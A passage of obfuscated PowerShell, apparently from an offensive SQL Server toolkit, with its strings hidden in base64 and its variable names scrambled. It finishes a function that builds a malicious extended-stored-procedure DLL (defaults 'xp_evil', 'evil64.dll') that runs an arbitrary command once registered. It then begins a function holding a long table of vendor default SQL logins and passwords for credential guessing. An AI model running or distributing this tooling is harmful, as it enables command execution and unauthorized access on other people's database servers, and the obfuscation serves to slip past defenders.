    ${/=\/\_/\_/=\/==\/} = ([system.Text.Encoding]::UTF8).GetBytes(${/=\/\/=\/\__/==\/})
    ${___/\/=\/\_/=\/\/} = [System.Text.Encoding]::ASCII.GetString(${____/\_/=\/\_/==\})
    ${__/\_/=\__/\___/\} = 0
    ${__/\_/=\__/\___/\} = ${___/\/=\/\_/=\/\/}.IndexOf(${__/\__/\/==\/\__/})
    if((${__/\_/=\__/\___/\} -eq 0) -and (${__/\_/=\__/\___/\} -ne -1))
    {
        throw($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABmAGkAbgBkACAAcwB0AHIAaQBuAGcAIAAkAHsAXwBfAC8AXABfAF8ALwBcAC8APQA9AFwALwBcAF8AXwAvAH0AIAAhAA=='))))
        Break
    }
    else
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABGAG8AdQBuAGQAIABiAHUAZgBmAGUAcgAgAG8AZgBmAHMAZQB0ACAAZgBvAHIAIABjAG8AbQBtAGEAbgBkADoAIAAkAHsAXwBfAC8AXABfAC8APQBcAF8AXwAvAFwAXwBfAF8ALwBcAH0A')))
    }
    for (${_/\_/\/\__/\____/} = 0; ${_/\_/\/\__/\____/} -lt ${/=\/\_/\_/=\/==\/}.Length; ${_/\_/\/\__/\____/}++)
    {
        ${____/\_/=\/\_/==\}[${__/\_/=\__/\___/\}+${_/\_/\/\__/\____/}] = ${/=\/\_/\_/=\/==\/}[${_/\_/\/\__/\____/}]
    }
    ${/=\_/\/===\_/\__/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBWAEkATABFAFYASQBMAEUAVgBJAEwARQBWAEkATABFAFYASQBMAA==')))
    IF(-not($ExportName))
    {
        $ExportName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eABwAF8AZQB2AGkAbAA=')))
    }
    ${_/\/\_/=\_/\__/\/} = ${/=\_/\/===\_/\__/}.Length
    ${/=====\/=====\/=\} = $ExportName.Length
    If (${_/\/\_/=\_/\__/\/} -lt ${/=====\/=====\/=\})
    {
        Write-Warning -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABUAGgAZQAgAGYAdQBuAGMAdABpAG8AbgAgAG4AYQBtAGUAIABpAHMAIAB0AG8AbwAgAGwAbwBuAGcAIQA=')))
        Break
    }
    else
    {
        ${__/====\/\_/===\/} = ${_/\/\_/=\_/\__/\/} - ${/=====\/=====\/=\}
        ${/=\_______/\/==\_} = '' * ${__/====\/\_/===\/}
    }
    ${____/==\/===\/\__} = 0
    ${/=====\/\/==\/\__} = [System.Text.Encoding]::ASCII.GetString(${____/\_/=\/\_/==\})
    ${____/==\/===\/\__} = ${/=====\/\/==\/\__}.IndexOf(${/=\_/\/===\_/\__/})
    if((${____/==\/===\/\__} -eq 0) -and (${____/==\/===\/\__} -ne -1))
    {
        throw($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIABmAGkAbgBkACAAcwB0AHIAaQBuAGcAIAAkAHsALwA9AFwAXwAvAFwALwA9AD0APQBcAF8ALwBcAF8AXwAvAH0AIQA='))))
        Break
    }
    else
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABGAG8AdQBuAGQAIABiAHUAZgBmAGUAcgAgAG8AZgBmAHMAZQB0ACAAZgBvAHIAIABmAHUAbgBjAHQAaQBvAG4AIABuAGEAbQBlADoAIAAkAHsAXwBfAF8AXwAvAD0APQBcAC8APQA9AD0AXAAvAFwAXwBfAH0A')))
    }
    ${/=\/\___/==\/=\_/} = ([system.Text.Encoding]::UTF8).GetBytes($ExportName)
    for (${_/\_/\/\__/\____/} = 0; ${_/\_/\/\__/\____/} -lt ${/=\/\___/==\/=\_/}.Length; ${_/\_/\/\__/\____/}++)
    {
        ${____/\_/=\/\_/==\}[${____/==\/===\/\__}+${_/\_/\/\__/\____/}] = ${/=\/\___/==\/=\_/}[${_/\_/\/\__/\____/}]
    }
    ${/==\/=\_/=\/=\/\/} = ${____/==\/===\/\__}+${/=====\/=====\/=\}
    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABGAG8AdQBuAGQAIABiAHUAZgBmAGUAcgAgAG8AZgBmAHMAZQB0ACAAZgBvAHIAIABiAHUAZgBmAGUAcgA6ACAAJAB7AC8APQA9AFwALwA9AFwAXwAvAD0AXAAvAD0AXAAvAFwALwB9AA==')))
    ${___/=====\/\/=\/=} = ([system.Text.Encoding]::UTF8).GetBytes(${/=\_______/\/==\_})
    for (${_/\_/\/\__/\____/} = 0; ${_/\_/\/\__/\____/} -lt ${__/====\/\_/===\/}; ${_/\_/\/\__/\____/}++)
    {
        ${____/\_/=\/\_/==\}[${/==\/=\_/=\/=\/\/}+${_/\_/\/\__/\____/}] = ${___/=====\/\/=\/=}[${_/\_/\/\__/\____/}]
    }
    IF(-not($OutFile))
    {
        $OutFile = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBcAGUAdgBpAGwANgA0AC4AZABsAGwA')))
    }
    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbgBnACAARABMAEwAIAAkAE8AdQB0AEYAaQBsAGUA')))
    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAARQB4AHAAbwByAHQAZQBkACAAZgB1AG4AYwB0AGkAbwBuACAAbgBhAG0AZQA6ACAAJABFAHgAcABvAHIAdABOAGEAbQBlAA==')))
    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAARQB4AHAAbwByAHQAZQBkACAAZgB1AG4AYwB0AGkAbwBuACAAYwBvAG0AbQBhAG4AZAA6ACAAIgAkAEMAbwBtAG0AYQBuAGQAIgA=')))
    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAATQBhAG4AdQBhAGwAIAB0AGUAcwB0ADoAIAByAHUAbgBkAGwAbAAzADIAIAAkAE8AdQB0AEYAaQBsAGUALAAkAEUAeABwAG8AcgB0AE4AYQBtAGUA')))
    sc -Value ${____/\_/=\/\_/==\} -Encoding Byte -Path $OutFile
    Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAARABMAEwAIAB3AHIAaQB0AHQAZQBuAA==')))
    Write-Verbose -Message ' '
    Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgAE4AbwB0AGUAcwA=')))
    Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABlAHgAcABvAHIAdABlAGQAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbgAgAGIAZQAgAHIAZQBnAGkAcwB0AGUAcgBlAGQAIABhAHMAIABhACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGUAeAB0AGUAbgBkAGUAZAAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUALgAgAE8AcAB0AGkAbwBuAHMAIABiAGUAbABvAHcAOgA=')))
    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAAUgBlAGcAaQBzAHQAZQByACAAeABwACAAdgBpAGEAIABsAG8AYwBhAGwAIABkAGkAcwBrADoAIABzAHAAXwBhAGQAZABlAHgAdABlAG4AZABlAGQAcAByAG8AYwAgACcAJABFAHgAcABvAHIAdABOAGEAbQBlACcALAAgACcAYwA6AFwAdABlAG0AcABcAG0AeQB4AHAALgBkAGwAbAAnAA==')))
    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAAUgBlAGcAaQBzAHQAZQByACAAeABwACAAdgBpAGEAIABVAE4AQwAgAHAAYQB0AGgAOgAgAHMAcABfAGEAZABkAGUAeAB0AGUAbgBkAGUAZABwAHIAbwBjACAAJwAkAEUAeABwAG8AcgB0AE4AYQBtAGUAJwAsACAAJwBcAFwAcwBlAHIAdgBlAHIAbgBhAG0AZQBcAHAAYQB0AGgAdABvAGYAaQBsAGUAXABtAHkAeABwAC4AZABsAGwAJwA=')))
    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAAVQBuAHIAZQBnAGkAcwB0AGUAcgAgAHgAcAA6ACAAcwBwAF8AZAByAG8AcABlAHgAdABlAG4AZABlAGQAcAByAG8AYwAgACcAJABFAHgAcABvAHIAdABOAGEAbQBlACcA')))
}
Function  Get-SQLServerLoginDefaultPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA==')))) | Out-Null
        ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) | Out-Null
        ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA==')))) | Out-Null
        ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))) | Out-Null 
        ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFMAeQBzAEEAZABtAGkAbgA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\} = New-Object System.Data.DataTable
        ${/==\__/=\/=\/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))) | Out-Null        
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAFMA'))),"ej","ej") | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAFQANwA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAGcAZQA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBPAE0AMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBhAF8AYQBkAG0AaQBuAA==')))) | out-null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBSAEkAUwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBSAEkAUwA5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBAFIASQBTACEAMQBkAG0AOQBuACMA')))) | out-null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBkAGUAcwBrAFYAYQB1AGwAdAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBkAGUAcwBrAFYAYQB1AGwAdABAADIANgAyADAAMAA=')))) | Out-Null      
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBPAFMAQwBIAFMAUQBMAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAFMAcwBxAGwAMQAyADMANAA1AA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBQAEEAUwBFAFIAVgBFAFIAOQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBNAGEAdABlAEIAUABBADkA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBEAFIARABJAEMATwBNAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBEAFIARABpAGMAbwBtADUAMAAhAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBPAEQARQBQAEEATAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGQAMwBwAEAAbAA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBPAEQARQBQAEEATAAwADgA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGQAMwBwAEAAbAA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbgB0AGUAcgBQAG8AaQBuAHQA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbgB0AGUAcgBQAG8AaQBuAHQAOAA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFMAUQBMADAANQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBMAE4AQQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBMAE4AQQBkAG0AaQBuAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFMAUQBMADAANQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG0AYgByAGkAZABnAGUAUwBvAGYAdABfAFMAQQA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBBAEQAUwBRAEwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBBAEQAUwBRAEwAQQBkAG0AaQBuAFUAcwBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByADQAMQBnADEAcwB0AGgAMwBNADQAbgAhAA==')))) | Out-Null  
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABIAEwARQBBAFMAWQBTAEgASQBQAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABIAEwAYQBkAG0AaQBuAEAAMQA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABQAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBhAF8AYQBkAG0AaQBuAA==')))) | out-null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABWAFQARQBMAA=='))),"sa","") | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBBAFMAWQBTAEgASQBQAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABIAEwAYQBkAG0AaQBuAEAAMQA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBDAEMA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBlAGIAZwBpAGwAaQB0AHkAMgAwADEAMQA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBDAE8AUABZAEQAQgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQArAEMAMABwAHkAMgAwADAANwBfAEAAeAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQArAEMAMABwAHkAMgAwADAANwBfAEAAeAA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBDAE8AUABZAEQAQgA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBjAG8AcAB5AA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGUAcgBzAG8AbgAyADAAMQAyAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAAyAEUAbQBlAHIAcwBvAG4ANAAyAEUAbQBlAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABEAFAAUwA='))),"sa","sa") | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABQAEQAUwBTAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABwAGQAcwBkAGIAMAAwADAAMAAwADEA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABQAEQAUwBTAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABwAGQAcwBzAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFMARQBSAFQARwBUAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGkA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHkAYgBvAGEANQA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFMARQBSAFQARwBUAA=='))),"sa","") | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQAUgBBAFYARQBUAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBlAGIAcwB0AGUAcgAjADEA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBZAE0ATwBWAEkARQBTAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAA5AEEAcgBhAG4AdQBIAEEANwA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABDAEEATQBFAFIASQBDAEEA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABjAEEAbQBlAHIAMQBjAGEA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABDAEEATQBFAFIASQBDAEEA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABDAEEAbQBlAHIAaQBjAGEA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAEkAUwBNAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAHQAZQByADAAOAA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBNAFMAUQBMAEQAQQBUAEEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGEAbgBnAGUA')))) | out-null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAEMATABPAEMAQQBMAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQB5AHAAYQBzAHMAdwBvAHIAZAA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBCAEEAVAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwA0AFQASgA0AEAAIwAkAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBJAFQA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwA0AFQASgA0AEAAIwAkAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBDAE8A'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwA0AFQASgA0AEAAIwAkAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAEQAQgBFAEEATQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwA0AFQASgA0AEAAIwAkAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAEwARQBTAEwATwBHAEkAWAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBMAFgATQBhAHMAdABlAHIA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQARQBYAEkAUwBfAFMAUQBMAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgBCAGUAQwBoAGEAbgBnAGUAZAA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAMgBLADUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB2AHMAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwB2AHMAZAA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwARQBYAFAAUgBFAFMAUwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBhAF8AYQBkAG0AaQBuAA==')))) | out-null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEATgBEAEEAUgBEAEQARQBWADIAMAAxADQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHMAdAA=')))) | Out-Null 
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAFcAXwBTAFEATABFAFgAUABSAEUAUwBTAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHcA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBvAGMAbwBsAGwAZQBjAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBvAGMAbwBsAGwAZQBjAHQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBvAGMAbwBsAGwAZQBjAHQA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBTAEQATwBUAE4ARQBUAA=='))),"sa","") | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBTAFEATAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADEA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBBAFMARQBXAEkAUwBFAA=='))),"sa","") | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBBAE4AVABBAEcARQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dgBhAG4AdABhAGcAZQAxADIAIQA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBDAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBjAG0AZABiAHUAcwBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBjAG0AdQBzAGUAcgBAADAANgA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBDAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBjAG0AZABiAHUAcwBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYQByAGEAQAAwADYA')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAFgASQBTAF8ARABBAFQAQQA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHgAaQBzAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAFgASQBTAF8ARABBAFQAQQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHgAaQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHgAaQBzAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAFQASwBJAE4ARwBEAE8ATQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAFQASwBJAE4ARwBEAE8ATQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAGkAJABtAGkAYwBNAGkAYwByAG8A')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFADcAXwBNAFMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAHYAaQBzAG8AcgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AHAAZQByAHYAaQBzAG8AcgA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFADcAXwBNAFMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAA==')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBIAEQA'))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBoAGQAdQBzAGEAQAAxADIAMwA=')))) | Out-Null
        ${/==\__/=\/=\/=\/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBQAEMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHIAdgBpAGMAZQBhAGQAbQBpAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAC4AMAA=')))) | Out-Null           
